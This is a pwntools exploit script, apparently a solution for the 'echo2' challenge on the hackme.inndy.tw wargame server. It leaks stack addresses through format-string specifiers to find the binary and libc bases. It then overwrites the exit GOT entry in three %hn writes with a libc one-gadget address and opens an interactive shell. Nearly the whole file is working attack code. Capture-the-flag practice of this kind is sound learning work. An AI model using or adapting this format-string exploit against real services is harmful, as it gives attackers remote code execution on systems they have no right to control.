from pwn import *
import sys, os
import re

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0

#MAGIC = 0x0f1117      #locallibc
MAGIC = 0x0f0897       #remotelibc

context(arch='amd64', os='linux', log_level='debug')

def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr = 0):
    global mypid
    mypid = proc.pidof(r)[0]
    raw_input('debug:')
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        gdb.attach(r, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr)+"\nb 0x7fde6384f0e7")    #b vfprintf.c:2022



#r = process('/home/h11p/hackme/echo2')

r = remote('hackme.inndy.tw', 7712)

elf = ELF('/home/h11p/hackme/echo2')



printf_got_addr = elf.got['printf']
printf_plt_addr = elf.plt['printf']

exit_got_addr = elf.got['exit']
exit_plt_addr = elf.plt['exit']


system_got_addr = elf.got['system']
system_plt_addr = elf.plt['system']

#print "%x" %  elf.address


#debug(addr=0x000000000000097F)
payload_leak="aaaaaaaa.%43$p.%41$p.%42$p"

def test_leak():
    payload="aaaaaaaa."
    for i in xrange(40,45):
        payload=payload+"%"+str(i)+"$p"
        payload=payload+"."
    print payload
    r.sendline(payload)
    r.recv()

def ext(lp_num):
    if len(lp_num)==4:
        return "c"
    return ""

#test_leak()



r.sendline(payload_leak)
recv_all=r.recv().split(".")
base_module=eval(recv_all[-2]) -0xa03
print hex(base_module)
libc_module=eval(recv_all[-3]) -0x20830
print hex(libc_module)


exit_addr=base_module+exit_got_addr
print_addr=base_module+printf_got_addr
system_addr=base_module+system_plt_addr
got_system_addr=base_module+system_got_addr
plt_print_addr=base_module+printf_plt_addr
MAGIC_addr=libc_module+MAGIC

hex_exit_addr=hex(exit_addr)
hex_system_addr=hex(system_addr)
hex_got_system_addr=hex(got_system_addr)
hex_print_addr=hex(print_addr)
hex_plt_print_addr=hex(plt_print_addr)
hex_MAGIC_addr=hex(MAGIC_addr)

print "system_got:"+hex_got_system_addr
print "print_got:"+hex_print_addr
print "system_plt:"+hex_system_addr
print "print_plt:"+hex_plt_print_addr
print "MAGIC:"+hex_MAGIC_addr


#payload="bbbbbbaaaaaaa%154c%9$hhn"+p64(print_addr)
#0x5579cf0ab78c
lp1=str(int(int(hex_MAGIC_addr[-4:],16))-19)
lp2=str(int(int(hex_MAGIC_addr[-8:-4],16))-19)
lp3=str(int(int(hex_MAGIC_addr[-12:-8],16))-19)



payload1 = ext(lp1)+"ccccccbbbbbbaaaaaaa%"+lp1+"c%10$hn"+p64(exit_addr)


payload2 = ext(lp2)+"ccccccbbbbbbaaaaaaa%"+lp2+"c%10$hn"+p64(exit_addr+2)


payload3 = ext(lp3)+"ccccccbbbbbbaaaaaaa%"+lp3+"c%10$hn"+p64(exit_addr+4)


r.sendline(payload1)

r.sendline(payload2)
r.sendline(payload3)

r.sendline('exit')
#r.sendline('ls')
#r.sendline("as")


r.interactive()
